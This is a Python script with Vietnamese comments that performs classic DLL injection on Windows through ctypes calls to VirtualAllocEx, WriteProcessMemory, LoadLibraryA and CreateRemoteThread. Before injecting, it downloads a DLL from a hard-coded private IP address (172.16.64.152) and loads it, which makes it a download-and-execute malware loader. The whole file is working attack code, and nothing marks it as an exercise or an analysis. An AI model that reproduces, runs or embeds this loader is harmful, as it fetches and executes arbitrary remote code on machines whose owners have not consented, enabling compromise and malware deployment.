import os
import sys
import ctypes
from ctypes import wintypes
import urllib.request

# ==================== HẰNG SỐ ====================
MEM_COMMIT  = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04

# ==================== KHAI BÁO API ====================
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.GetCurrentProcess.argtypes = []

kernel32.VirtualAllocEx.restype = ctypes.c_void_p
kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t,
    wintypes.DWORD, wintypes.DWORD
]

kernel32.WriteProcessMemory.restype = wintypes.BOOL
kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p,
    ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
]

kernel32.GetModuleHandleA.restype = wintypes.HMODULE
kernel32.GetModuleHandleA.argtypes = [wintypes.LPCSTR]

kernel32.GetProcAddress.restype = ctypes.c_void_p
kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]

kernel32.CreateRemoteThread.restype = wintypes.HANDLE
kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t,
    ctypes.c_void_p, ctypes.c_void_p,
    wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)
]

kernel32.WaitForSingleObject.restype = wintypes.DWORD
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

kernel32.CloseHandle.restype = wintypes.BOOL
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]

# Bước 1: Lấy handle tiến trình hiện tại
hProcess = kernel32.GetCurrentProcess()

# Tải DLL từ máy chủ
url = "http://172.16.64.152/test.dll"
urllib.request.urlretrieve(url, "test.dll")
dll_path = os.path.abspath("test.dll")
dll_bytes = dll_path.encode('utf-8') + b'\x00'

# Bước 2: Cấp phát bộ nhớ
addr = kernel32.VirtualAllocEx(
    hProcess, None, len(dll_bytes),
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
)

# Bước 3: Ghi đường dẫn DLL vào bộ nhớ
written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(
    hProcess, ctypes.c_void_p(addr),
    dll_bytes, len(dll_bytes),
    ctypes.byref(written)
)

# Bước 4: Phân giải LoadLibraryA và tạo luồng thực thi
h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
load_lib_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

thread_id = wintypes.DWORD(0)
hThread = kernel32.CreateRemoteThread(
    hProcess, None, 0,
    ctypes.c_void_p(load_lib_addr),
    ctypes.c_void_p(addr),
    0, ctypes.byref(thread_id)
)

if hThread:
    print(f"[+] Inject thành công!")
    kernel32.WaitForSingleObject(hThread, 10000)
    kernel32.CloseHandle(hThread)
else:
    print(f"[-] Inject thất bại. Lỗi: {ctypes.get_last_error()}")